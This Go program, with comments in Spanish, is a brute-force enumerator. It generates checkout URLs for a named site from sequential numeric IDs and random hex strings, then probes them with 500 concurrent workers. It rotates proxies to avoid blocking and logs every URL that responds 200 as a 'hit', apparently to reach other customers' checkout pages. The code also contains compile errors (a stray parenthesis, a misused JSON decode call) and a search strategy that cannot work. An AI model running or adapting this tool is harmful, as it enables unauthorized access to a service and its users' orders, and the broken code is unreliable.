package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "io"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "strings"
    "sync"
    "time"
)

// --- CONFIGURACIÓN DE API / KEYS (config.json) ---
type Config struct {
    ApiKey      string `json:"api_key"`
    BearerToken string `json:"bearer_token"`
}

var appConfig Config

// --- COLORES ---
const (
    ColorReset  = "\033[0m"
    ColorRed    = "\033[31m"
    ColorGreen  = "\033[32m"
    ColorYellow = "\033[33m"
    ColorCyan   = "\033[36m"
    ColorWhite  = "\033[97m"
)

// --- ESTADÍSTICAS GLOBALES ---
var (
    validCount   int
    invalidCount int
    retries      int
    mu           sync.Mutex
    stopFlag     bool // Por si queremos parar manualmente (opcional)
)

// Estructura para pasar trabajo al Worker
type Job struct {
    Link string
}

// --- FUNCIÓN PRINCIPAL ---
func main() {
    rand.Seed(time.Now().UnixNano())
    startTime := time.Now()

    // Cargar config si existe
    loadConfig()

    // Cargar Proxies
    proxies, _ := loadLines("proxies.txt")
    if len(proxies) == 0 {
        fmt.Println(string(ColorYellow), "[!] MODO SIN PROXY: Usando tu IP real. Cuidado con el bloqueo.", string(ColorReset))
    } else {
        fmt.Printf("%s[*] %d proxies cargados.%s\n", ColorCyan, len(proxies), ColorReset)
    }

    // Canales
    jobs := make(chan Job, 2000) // Buffer grande para el generador
    var wg sync.WaitGroup

    // 1. Lanzar Workers (Hilos de verificación)
    numWorkers := 500 // Ajusta esto según tu potencia
    fmt.Printf("%s[*] Iniciando %d Workers de verificación...%s\n", ColorCyan, numWorkers, ColorReset)
    for i := 0; i < numWorkers; i++ {
        wg.Add(1)
        go worker(jobs, &wg, proxies)
    }

    // 2. Lanzar Generador de Links (Productor)
    go linkGenerator(jobs)

    // 3. Lanzar Interfaz de Usuario (Estadísticas en vivo)
    go uiManager(startTime)

    // Esperar (El programa nunca termina solo debido al generador infinito)
    wg.Wait() 
}

// --- GENERADOR DE LINKS (LÓGICA) ---
func linkGenerator(jobs chan<- Job) {
    // CONFIGURACIÓN DEL PATRÓN
    // Basado en tus ejemplos: https://resellme.xyz/checkout/ID1-ID2
    
    baseURL := "https://resellme.xyz/checkout/"
    
    // ID1: cd19684beb903 (13 chars hex) -> Asumiremos una parte fija + random o fuerza bruta
    // ID2: 0000010850604 (13 chars numéricos)
    
    fmt.Printf("%s[*] Generando combinaciones y probando...%s\n", ColorCyan, ColorReset))

    // Estrategia Híbrida: 
    // 1. Barrido Secuencial (Rápido para encontrar patrones)
    // 2. Random (Para cubrir huecos)
    
    // Ejemplo: Vamos a iterar el ID numérico (ID2) asumiendo que los IDs cercanos funcionan.
    // Puedes cambiar el rango de inicio aquí:
    currentNum := int64(1000000000000) // Empezar desde 1 billón (aprox basado en tu ejemplo)
    
    for {
        // Generar ID2 (13 dígitos numéricos)
        id2 := fmt.Sprintf("%013d", currentNum)
        
        // Generar ID1 (Hex)
        // Opción A: Random (para explorar)
        id1 := randomHex(13) 
        
        // Opción B: Si descubres un patrón fijo, descomenta abajo:
        // id1 = "cd19684beb903" 

        fullLink := fmt.Sprintf("%s%s-%s", baseURL, id1, id2)
        
        jobs <- Job{Link: fullLink}
        
        // Incrementar para la siguiente vuelta (barrido secuencial)
        currentNum++
        
        // Opcional: Reset si nos pasamos de largo (poco probable con 13 digitos)
        if currentNum > 1999999999999 {
            currentNum = 1000000000000
        }
    }
}

// --- WORKER (VERIFICADOR) ---
func worker(jobs <-chan Job, wg *sync.WaitGroup, proxies []string) {
    defer wg.Done()

    // Cliente HTTP rápido
    client := &http.Client{
        Timeout: 8 * time.Second, // Tiempo de espera corto
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // No seguir redirecciones, ahorrar tiempo
        },
    }

    for job := range jobs {
        checkLink(client, job.Link, proxies)
    }
}

func checkLink(client *http.Client, link string, proxies []string) {
    // Configurar Request
    req, err := http.NewRequest("HEAD", link, nil)
    if err != nil {
        return
    }

    // Headers (API Keys desde config.json)
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    if appConfig.ApiKey != "" {
        req.Header.Set("Authorization", "Bearer "+appConfig.ApiKey)
    }

    // Configurar Proxy Rotativo
    if len(proxies) > 0 {
        proxyStr := proxies[rand.Intn(len(proxies))]
        proxyURL, err := url.Parse(proxyStr)
        if err == nil {
            client.Transport = &http.Transport{
                Proxy: http.ProxyURL(proxyURL),
            }
        }
    } else {
        // Resetear transporte si no hay proxy para evitar uso de proxy anterior
        client.Transport = nil
    }

    resp, err := client.Do(req)
    if err != nil {
        // Error de red (timeout, proxy muerto)
        printResult(link, "RETRY", "Network Error")
        return
    }
    defer resp.Body.Close()
    io.Copy(io.Discard, resp.Body)

    // Lógica de clasificación
    if resp.StatusCode == 200 {
        printResult(link, "VALID", resp.Status)
        saveHit(link) // Guardar en archivo
    } else if resp.StatusCode == 404 {
        printResult(link, "INVALID", resp.Status)
    } else {
        // Otros errores (403, 500, etc)
        printResult(link, "RETRY", resp.Status) 
    }
}

// --- UTILIDADES ---

func printResult(link, statusType, detail string) {
    mu.Lock()
    defer mu.Unlock()
    
    if statusType == "VALID" {
        validCount++
        fmt.Printf("%s[VALID] %s - %s%s\n", ColorGreen, detail, link, ColorReset)
    } else if statusType == "RETRY" {
        // No imprimir todo para no saturar, o imprimir en amarillo
        // fmt.Printf("%s[RETRY] %s%s\n", ColorYellow, detail, ColorReset)
    } else {
        invalidCount++
        // No imprimimos los invalid para que la consola no parpadee tanto, 
        // solo mostramos contador en la UI.
    }
}

func uiManager(startTime time.Time) {
    // Limpia consola cada segundo y muestra stats
    for {
        time.Sleep(1 * time.Second)
        elapsed := time.Since(startTime).Truncate(time.Second)
        rate := float64(validCount+invalidCount) / elapsed.Seconds()
        
        fmt.Printf("\r%s[%s] Checks: %d | %sVALIDOS: %d%s | %sInvalidos: %d%s | Speed: %.0f/s%s", 
            ColorWhite, elapsed, 
            validCount+invalidCount, 
            ColorGreen, validCount, ColorReset,
            ColorRed, invalidCount, ColorReset,
            rate, ColorReset)
    }
}

func saveHit(link string) {
    f, err := os.OpenFile("hits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return
    }
    defer f.Close()
    f.WriteString(link + "\n")
}

func loadConfig() {
    file, err := os.Open("config.json")
    if err != nil { return }
    defer file.Close()
    decoder := json.NewDecoder(file)
    json.Decode(&appConfig)
}

func loadLines(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil { return nil, err }
    defer file.Close()
    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        line := strings.TrimSpace(scanner.Text())
        if line != "" { lines = append(lines, line) }
    }
    return lines, nil
}

func randomHex(n int) string {
    var letters = []rune("0123456789abcdef")
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}
